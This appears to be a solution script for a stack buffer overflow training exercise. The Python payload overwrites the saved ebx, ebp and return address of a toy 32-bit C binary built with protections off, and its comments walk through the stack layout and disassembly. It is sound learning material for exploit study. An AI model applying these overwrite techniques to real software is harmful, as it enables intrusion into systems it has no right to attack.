#!/usr/bin/python3

# gcc v9.3.0
# gcc -m32 -no-pie -fno-stack-protector -ggdb -mpreferred-stack-boundary=2 -z execstack -o smash_stack/stack4 smash_stack/stack4.c
# 
# python3 ./stack4.py | ./stack4
#
# The stack data is read backwards, from high to low
#
# We can't bypass the \x0a so we will try to jump to the code instruction after the jne of the if
# the return value is 80 bytes (buffer) + 4 (cookie) + 4 (offset memory) + 4 (ebp) + 4 (ret)
#  -> 92 + 4 = 96 values to override

# if (cookie == 0x000a0d00)
#  804920f:	8b 45 f8             	mov    eax,DWORD PTR [ebp-0x8]
#  8049212:	3d 00 0d 0a 00       	cmp    eax,0xa0d00
#  8049217:	75 0f                	jne    8049228 <main+0x52>
#         printf("you win!\n");
#  8049219:	8d 83 20 e0 ff ff    	lea    eax,[ebx-0x1fe0]
#  804921f:	50                   	push   eax
#  8049220:	e8 7b fe ff ff       	call   80490a0 <puts@plt>
#  8049225:	83 c4 04             	add    esp,0x4
#  8049228:	b8 00 00 00 00       	mov    eax,0x0
# }
#  804922d:	8b 5d fc             	mov    ebx,DWORD PTR [ebp-0x4]
#  8049230:	c9                   	leave  
#  8049231:	c3                   	ret   

# The memory position of the first instruction in the if is 0x08049219 (gdb -> disas main)
# The string to be printed is located at [ebx-0x1fe0]
# 
# The value of ebx is updated with the value of [ebp-0x4] before ret, is a value that we can
# overwride with the stack overflow attack. We just need to know the value of ebx before
# the jne (0x0849217).
# 
# With gdb, the value of ebx in that instruction is 0x0804c000. Then we write the value in
# the stack at [ebx-0x4] 
#

# Stack:
#     Low                                                                        High
#     | buffer (80b) | cookie (4b) | offset addr (4b) | old ebp (4b) | ret addr (4b) |

# 
#
# Fix seg fault:
# 
# Overwrite the ebp with our new ebp pointin \x00 (same as with normal execution)
# This new ebp points to [@cookie+0x10] because there is a separation of 4 bytes in the stack.
# After the new ebp value we write the ret address of normal execution, so when the ret loads
# the value after the ebp it continues like nothing happened (0xf7de2ee5)
#

import sys

smasher = b"A"*84 + b"\x00\xc0\x04\x08" + b"\x90\xcf\xff\xff" + b"\x19\x92\x04\x08" + b"\x00"*4 + b"\xe5\x2e\xde\xf7"
# | ebx string base | overwrite ebp to our new ebp | firts if intruction | normal execution ebp value | normal ret value |
#                                  \-----------------------------------------------------^ 

sys.stdout.buffer.write(smasher)